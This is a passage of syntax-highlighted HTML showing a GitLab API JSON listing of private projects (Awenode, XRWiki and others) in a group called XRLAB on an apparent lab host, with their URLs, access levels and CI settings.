+</span></span><span class="line"><span class="cl">            &#34;issues&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/4/issues&#34;,
+</span></span><span class="line"><span class="cl">            &#34;merge_requests&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/4/merge_requests&#34;,
+</span></span><span class="line"><span class="cl">            &#34;repo_branches&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/4/repository/branches&#34;,
+</span></span><span class="line"><span class="cl">            &#34;labels&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/4/labels&#34;,
+</span></span><span class="line"><span class="cl">            &#34;events&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/4/events&#34;,
+</span></span><span class="line"><span class="cl">            &#34;members&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/4/members&#34;,
+</span></span><span class="line"><span class="cl">            &#34;cluster_agents&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/4/cluster_agents&#34;
+</span></span><span class="line"><span class="cl">        },
+</span></span><span class="line"><span class="cl">        &#34;packages_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;empty_repo&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;archived&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;visibility&#34;: &#34;private&#34;,
+</span></span><span class="line"><span class="cl">        &#34;resolve_outdated_diff_discussions&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;container_expiration_policy&#34;: {
+</span></span><span class="line"><span class="cl">            &#34;cadence&#34;: &#34;1d&#34;,
+</span></span><span class="line"><span class="cl">            &#34;enabled&#34;: false,
+</span></span><span class="line"><span class="cl">            &#34;keep_n&#34;: 10,
+</span></span><span class="line"><span class="cl">            &#34;older_than&#34;: &#34;90d&#34;,
+</span></span><span class="line"><span class="cl">            &#34;name_regex&#34;: &#34;.*&#34;,
+</span></span><span class="line"><span class="cl">            &#34;name_regex_keep&#34;: null,
+</span></span><span class="line"><span class="cl">            &#34;next_run_at&#34;: &#34;2022-12-26T07:48:16.788Z&#34;
+</span></span><span class="line"><span class="cl">        },
+</span></span><span class="line"><span class="cl">        &#34;issues_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;merge_requests_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;wiki_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;jobs_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;snippets_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;container_registry_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;service_desk_enabled&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;service_desk_address&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;can_create_merge_request_in&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;issues_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;repository_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;merge_requests_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;forking_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;wiki_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;builds_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;snippets_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;pages_access_level&#34;: &#34;private&#34;,
+</span></span><span class="line"><span class="cl">        &#34;operations_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;analytics_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;container_registry_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;security_and_compliance_access_level&#34;: &#34;private&#34;,
+</span></span><span class="line"><span class="cl">        &#34;releases_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;environments_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;feature_flags_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;infrastructure_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;monitor_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;emails_disabled&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;shared_runners_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;lfs_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;creator_id&#34;: 2,
+</span></span><span class="line"><span class="cl">        &#34;import_url&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;import_type&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;import_status&#34;: &#34;none&#34;,
+</span></span><span class="line"><span class="cl">        &#34;open_issues_count&#34;: 0,
+</span></span><span class="line"><span class="cl">        &#34;ci_default_git_depth&#34;: 20,
+</span></span><span class="line"><span class="cl">        &#34;ci_forward_deployment_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;ci_job_token_scope_enabled&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;ci_separated_caches&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;ci_opt_in_jwt&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;ci_allow_fork_pipelines_to_run_in_parent_project&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;public_jobs&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;build_timeout&#34;: 3600,
+</span></span><span class="line"><span class="cl">        &#34;auto_cancel_pending_pipelines&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;ci_config_path&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;shared_with_groups&#34;: [
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        ],
+</span></span><span class="line"><span class="cl">        &#34;only_allow_merge_if_pipeline_succeeds&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;allow_merge_on_skipped_pipeline&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;restrict_user_defined_variables&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;request_access_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;only_allow_merge_if_all_discussions_are_resolved&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;remove_source_branch_after_merge&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;printing_merge_request_link_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;merge_method&#34;: &#34;merge&#34;,
+</span></span><span class="line"><span class="cl">        &#34;squash_option&#34;: &#34;default_off&#34;,
+</span></span><span class="line"><span class="cl">        &#34;enforce_auth_checks_on_uploads&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;suggestion_commit_message&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;merge_commit_template&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;squash_commit_template&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;issue_branch_template&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;auto_devops_enabled&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;auto_devops_deploy_strategy&#34;: &#34;continuous&#34;,
+</span></span><span class="line"><span class="cl">        &#34;autoclose_referenced_issues&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;keep_latest_artifact&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;runner_token_expiration_interval&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;permissions&#34;: {
+</span></span><span class="line"><span class="cl">            &#34;project_access&#34;: null,
+</span></span><span class="line"><span class="cl">            &#34;group_access&#34;: {
+</span></span><span class="line"><span class="cl">                &#34;access_level&#34;: 50,
+</span></span><span class="line"><span class="cl">                &#34;notification_level&#34;: 3
+</span></span><span class="line"><span class="cl">            }
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    },
+</span></span><span class="line"><span class="cl">    {
+</span></span><span class="line"><span class="cl">        &#34;id&#34;: 3,
+</span></span><span class="line"><span class="cl">        &#34;description&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;name&#34;: &#34;Awenode&#34;,
+</span></span><span class="line"><span class="cl">        &#34;name_with_namespace&#34;: &#34;XRLAB / Awenode&#34;,
+</span></span><span class="line"><span class="cl">        &#34;path&#34;: &#34;awenode&#34;,
+</span></span><span class="line"><span class="cl">        &#34;path_with_namespace&#34;: &#34;xrlab/awenode&#34;,
+</span></span><span class="line"><span class="cl">        &#34;created_at&#34;: &#34;2022-12-25T07:46:43.635Z&#34;,
+</span></span><span class="line"><span class="cl">        &#34;default_branch&#34;: &#34;master&#34;,
+</span></span><span class="line"><span class="cl">        &#34;tag_list&#34;: [
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        ],
+</span></span><span class="line"><span class="cl">        &#34;topics&#34;: [
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        ],
+</span></span><span class="line"><span class="cl">        &#34;ssh_url_to_repo&#34;: &#34;git@gitlab.xiaorang.lab:xrlab/awenode.git&#34;,
+</span></span><span class="line"><span class="cl">        &#34;http_url_to_repo&#34;: &#34;http://gitlab.xiaorang.lab/xrlab/awenode.git&#34;,
+</span></span><span class="line"><span class="cl">        &#34;web_url&#34;: &#34;http://gitlab.xiaorang.lab/xrlab/awenode&#34;,
+</span></span><span class="line"><span class="cl">        &#34;readme_url&#34;: &#34;http://gitlab.xiaorang.lab/xrlab/awenode/-/blob/master/README.md&#34;,
+</span></span><span class="line"><span class="cl">        &#34;avatar_url&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;forks_count&#34;: 0,
+</span></span><span class="line"><span class="cl">        &#34;star_count&#34;: 0,
+</span></span><span class="line"><span class="cl">        &#34;last_activity_at&#34;: &#34;2022-12-25T07:46:43.635Z&#34;,
+</span></span><span class="line"><span class="cl">        &#34;namespace&#34;: {
+</span></span><span class="line"><span class="cl">            &#34;id&#34;: 8,
+</span></span><span class="line"><span class="cl">            &#34;name&#34;: &#34;XRLAB&#34;,
+</span></span><span class="line"><span class="cl">            &#34;path&#34;: &#34;xrlab&#34;,
+</span></span><span class="line"><span class="cl">            &#34;kind&#34;: &#34;group&#34;,
+</span></span><span class="line"><span class="cl">            &#34;full_path&#34;: &#34;xrlab&#34;,
+</span></span><span class="line"><span class="cl">            &#34;parent_id&#34;: null,
+</span></span><span class="line"><span class="cl">            &#34;avatar_url&#34;: null,
+</span></span><span class="line"><span class="cl">            &#34;web_url&#34;: &#34;http://gitlab.xiaorang.lab/groups/xrlab&#34;
+</span></span><span class="line"><span class="cl">        },
+</span></span><span class="line"><span class="cl">        &#34;_links&#34;: {
+</span></span><span class="line"><span class="cl">            &#34;self&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/3&#34;,
+</span></span><span class="line"><span class="cl">            &#34;issues&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/3/issues&#34;,
+</span></span><span class="line"><span class="cl">            &#34;merge_requests&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/3/merge_requests&#34;,
+</span></span><span class="line"><span class="cl">            &#34;repo_branches&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/3/repository/branches&#34;,
+</span></span><span class="line"><span class="cl">            &#34;labels&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/3/labels&#34;,
+</span></span><span class="line"><span class="cl">            &#34;events&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/3/events&#34;,
+</span></span><span class="line"><span class="cl">            &#34;members&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/3/members&#34;,
+</span></span><span class="line"><span class="cl">            &#34;cluster_agents&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/3/cluster_agents&#34;
+</span></span><span class="line"><span class="cl">        },
+</span></span><span class="line"><span class="cl">        &#34;packages_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;empty_repo&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;archived&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;visibility&#34;: &#34;private&#34;,
+</span></span><span class="line"><span class="cl">        &#34;resolve_outdated_diff_discussions&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;container_expiration_policy&#34;: {
+</span></span><span class="line"><span class="cl">            &#34;cadence&#34;: &#34;1d&#34;,
+</span></span><span class="line"><span class="cl">            &#34;enabled&#34;: false,
+</span></span><span class="line"><span class="cl">            &#34;keep_n&#34;: 10,
+</span></span><span class="line"><span class="cl">            &#34;older_than&#34;: &#34;90d&#34;,
+</span></span><span class="line"><span class="cl">            &#34;name_regex&#34;: &#34;.*&#34;,
+</span></span><span class="line"><span class="cl">            &#34;name_regex_keep&#34;: null,
+</span></span><span class="line"><span class="cl">            &#34;next_run_at&#34;: &#34;2022-12-26T07:46:44.614Z&#34;
+</span></span><span class="line"><span class="cl">        },
+</span></span><span class="line"><span class="cl">        &#34;issues_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;merge_requests_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;wiki_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;jobs_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;snippets_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;container_registry_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;service_desk_enabled&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;service_desk_address&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;can_create_merge_request_in&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;issues_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;repository_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;merge_requests_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;forking_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;wiki_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;builds_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;snippets_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;pages_access_level&#34;: &#34;private&#34;,
+</span></span><span class="line"><span class="cl">        &#34;operations_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;analytics_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;container_registry_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;security_and_compliance_access_level&#34;: &#34;private&#34;,
+</span></span><span class="line"><span class="cl">        &#34;releases_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;environments_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;feature_flags_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;infrastructure_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;monitor_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;emails_disabled&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;shared_runners_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;lfs_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;creator_id&#34;: 2,
+</span></span><span class="line"><span class="cl">        &#34;import_url&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;import_type&#34;: &#34;gitlab_project&#34;,
+</span></span><span class="line"><span class="cl">        &#34;import_status&#34;: &#34;finished&#34;,
+</span></span><span class="line"><span class="cl">        &#34;open_issues_count&#34;: 0,
+</span></span><span class="line"><span class="cl">        &#34;ci_default_git_depth&#34;: 20,
+</span></span><span class="line"><span class="cl">        &#34;ci_forward_deployment_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;ci_job_token_scope_enabled&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;ci_separated_caches&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;ci_opt_in_jwt&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;ci_allow_fork_pipelines_to_run_in_parent_project&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;public_jobs&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;build_timeout&#34;: 3600,
+</span></span><span class="line"><span class="cl">        &#34;auto_cancel_pending_pipelines&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;ci_config_path&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;shared_with_groups&#34;: [
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        ],
+</span></span><span class="line"><span class="cl">        &#34;only_allow_merge_if_pipeline_succeeds&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;allow_merge_on_skipped_pipeline&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;restrict_user_defined_variables&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;request_access_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;only_allow_merge_if_all_discussions_are_resolved&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;remove_source_branch_after_merge&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;printing_merge_request_link_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;merge_method&#34;: &#34;merge&#34;,
+</span></span><span class="line"><span class="cl">        &#34;squash_option&#34;: &#34;default_off&#34;,
+</span></span><span class="line"><span class="cl">        &#34;enforce_auth_checks_on_uploads&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;suggestion_commit_message&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;merge_commit_template&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;squash_commit_template&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;issue_branch_template&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;auto_devops_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;auto_devops_deploy_strategy&#34;: &#34;continuous&#34;,
+</span></span><span class="line"><span class="cl">        &#34;autoclose_referenced_issues&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;keep_latest_artifact&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;runner_token_expiration_interval&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;permissions&#34;: {
+</span></span><span class="line"><span class="cl">            &#34;project_access&#34;: {
+</span></span><span class="line"><span class="cl">                &#34;access_level&#34;: 40,
+</span></span><span class="line"><span class="cl">                &#34;notification_level&#34;: null
+</span></span><span class="line"><span class="cl">            },
+</span></span><span class="line"><span class="cl">            &#34;group_access&#34;: {
+</span></span><span class="line"><span class="cl">                &#34;access_level&#34;: 50,
+</span></span><span class="line"><span class="cl">                &#34;notification_level&#34;: 3
+</span></span><span class="line"><span class="cl">            }
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    },
+</span></span><span class="line"><span class="cl">    {
+</span></span><span class="line"><span class="cl">        &#34;id&#34;: 2,
+</span></span><span class="line"><span class="cl">        &#34;description&#34;: &#34;Example GitBook site using GitLab Pages: https://pages.gitlab.io/gitbook&#34;,
+</span></span><span class="line"><span class="cl">        &#34;name&#34;: &#34;XRWiki&#34;,
+</span></span><span class="line"><span class="cl">        &#34;name_with_namespace&#34;: &#34;XRLAB / XRWiki&#34;,
+</span></span><span class="line"><span class="cl">        &#34;path&#34;: &#34;xrwiki&#34;,
+</span></span><span class="line"><span class="cl">        &#34;path_with_namespace&#34;: &#34;xrlab/xrwiki&#34;,
+</span></span><span class="line"><span class="cl">        &#34;created_at&#34;: &#34;2022-12-25T07:44:18.589Z&#34;,
+</span></span><span class="line"><span class="cl">        &#34;default_branch&#34;: &#34;master&#34;,
+</span></span><span class="line"><span class="cl">        &#34;tag_list&#34;: [
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        ],
+</span></span><span class="line"><span class="cl">        &#34;topics&#34;: [
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        ],
+</span></span><span class="line"><span class="cl">        &#34;ssh_url_to_repo&#34;: &#34;git@gitlab.xiaorang.lab:xrlab/xrwiki.git&#34;,
+</span></span><span class="line"><span class="cl">        &#34;http_url_to_repo&#34;: &#34;http://gitlab.xiaorang.lab/xrlab/xrwiki.git&#34;,
+</span></span><span class="line"><span class="cl">        &#34;web_url&#34;: &#34;http://gitlab.xiaorang.lab/xrlab/xrwiki&#34;,
+</span></span><span class="line"><span class="cl">        &#34;readme_url&#34;: &#34;http://gitlab.xiaorang.lab/xrlab/xrwiki/-/blob/master/README.md&#34;,
+</span></span><span class="line"><span class="cl">        &#34;avatar_url&#34;: &#34;http://gitlab.xiaorang.lab/uploads/-/system/project/avatar/2/gitbook.png&#34;,
+</span></span><span class="line"><span class="cl">        &#34;forks_count&#34;: 0,
+</span></span><span class="line"><span class="cl">        &#34;star_count&#34;: 0,
+</span></span><span class="line"><span class="cl">        &#34;last_activity_at&#34;: &#34;2022-12-25T07:44:18.589Z&#34;,
+</span></span><span class="line"><span class="cl">        &#34;namespace&#34;: {
+</span></span><span class="line"><span class="cl">            &#34;id&#34;: 8,
+</span></span><span class="line"><span class="cl">            &#34;name&#34;: &#34;XRLAB&#34;,
+</span></span><span class="line"><span class="cl">            &#34;path&#34;: &#34;xrlab&#34;,
+</span></span><span class="line"><span class="cl">            &#34;kind&#34;: &#34;group&#34;,
+</span></span><span class="line"><span class="cl">            &#34;full_path&#34;: &#34;xrlab&#34;,
+</span></span><span class="line"><span class="cl">            &#34;parent_id&#34;: null,
+</span></span><span class="line"><span class="cl">            &#34;avatar_url&#34;: null,
+</span></span><span class="line"><span class="cl">            &#34;web_url&#34;: &#34;http://gitlab.xiaorang.lab/groups/xrlab&#34;
+</span></span><span class="line"><span class="cl">        },
+</span></span><span class="line"><span class="cl">        &#34;_links&#34;: {
+</span></span><span class="line"><span class="cl">            &#34;self&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/2&#34;,
+</span></span><span class="line"><span class="cl">            &#34;issues&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/2/issues&#34;,
+</span></span><span class="line"><span class="cl">            &#34;merge_requests&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/2/merge_requests&#34;,
+</span></span><span class="line"><span class="cl">            &#34;repo_branches&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/2/repository/branches&#34;,
+</span></span><span class="line"><span class="cl">            &#34;labels&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/2/labels&#34;,
+</span></span><span class="line"><span class="cl">            &#34;events&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/2/events&#34;,
+</span></span><span class="line"><span class="cl">            &#34;members&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/2/members&#34;,
+</span></span><span class="line"><span class="cl">            &#34;cluster_agents&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/2/cluster_agents&#34;
+</span></span><span class="line"><span class="cl">        },
+</span></span><span class="line"><span class="cl">        &#34;packages_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;empty_repo&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;archived&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;visibility&#34;: &#34;private&#34;,
+</span></span><span class="line"><span class="cl">        &#34;resolve_outdated_diff_discussions&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;container_expiration_policy&#34;: {
+</span></span><span class="line"><span class="cl">            &#34;cadence&#34;: &#34;1d&#34;,
+</span></span><span class="line"><span class="cl">            &#34;enabled&#34;: false,
+</span></span><span class="line"><span class="cl">            &#34;keep_n&#34;: 10,
+</span></span><span class="line"><span class="cl">            &#34;older_than&#34;: &#34;90d&#34;,
+</span></span><span class="line"><span class="cl">            &#34;name_regex&#34;: &#34;.*&#34;,
+</span></span><span class="line"><span class="cl">            &#34;name_regex_keep&#34;: null,
+</span></span><span class="line"><span class="cl">            &#34;next_run_at&#34;: &#34;2022-12-26T07:44:18.627Z&#34;
+</span></span><span class="line"><span class="cl">        },
+</span></span><span class="line"><span class="cl">        &#34;issues_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;merge_requests_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;wiki_enabled&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;jobs_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;snippets_enabled&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;container_registry_enabled&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;service_desk_enabled&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;service_desk_address&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;can_create_merge_request_in&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;issues_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;repository_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;merge_requests_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;forking_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;wiki_access_level&#34;: &#34;disabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;builds_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;snippets_access_level&#34;: &#34;disabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;pages_access_level&#34;: &#34;public&#34;,
+</span></span><span class="line"><span class="cl">        &#34;operations_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;analytics_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;container_registry_access_level&#34;: &#34;disabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;security_and_compliance_access_level&#34;: &#34;private&#34;,
+</span></span><span class="line"><span class="cl">        &#34;releases_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;environments_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;feature_flags_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;infrastructure_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;monitor_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;emails_disabled&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;shared_runners_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;lfs_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;creator_id&#34;: 2,
+</span></span><span class="line"><span class="cl">        &#34;import_url&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;import_type&#34;: &#34;gitlab_project&#34;,
+</span></span><span class="line"><span class="cl">        &#34;import_status&#34;: &#34;finished&#34;,
+</span></span><span class="line"><span class="cl">        &#34;open_issues_count&#34;: 0,
+</span></span><span class="line"><span class="cl">        &#34;ci_default_git_depth&#34;: 20,
+</span></span><span class="line"><span class="cl">        &#34;ci_forward_deployment_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;ci_job_token_scope_enabled&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;ci_separated_caches&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;ci_opt_in_jwt&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;ci_allow_fork_pipelines_to_run_in_parent_project&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;public_jobs&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;build_timeout&#34;: 3600,
+</span></span><span class="line"><span class="cl">        &#34;auto_cancel_pending_pipelines&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;ci_config_path&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;shared_with_groups&#34;: [
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        ],
+</span></span><span class="line"><span class="cl">        &#34;only_allow_merge_if_pipeline_succeeds&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;allow_merge_on_skipped_pipeline&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;restrict_user_defined_variables&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;request_access_enabled&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;only_allow_merge_if_all_discussions_are_resolved&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;remove_source_branch_after_merge&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;printing_merge_request_link_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;merge_method&#34;: &#34;merge&#34;,
+</span></span><span class="line"><span class="cl">        &#34;squash_option&#34;: &#34;default_off&#34;,
+</span></span><span class="line"><span class="cl">        &#34;enforce_auth_checks_on_uploads&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;suggestion_commit_message&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;merge_commit_template&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;squash_commit_template&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;issue_branch_template&#34;: null,
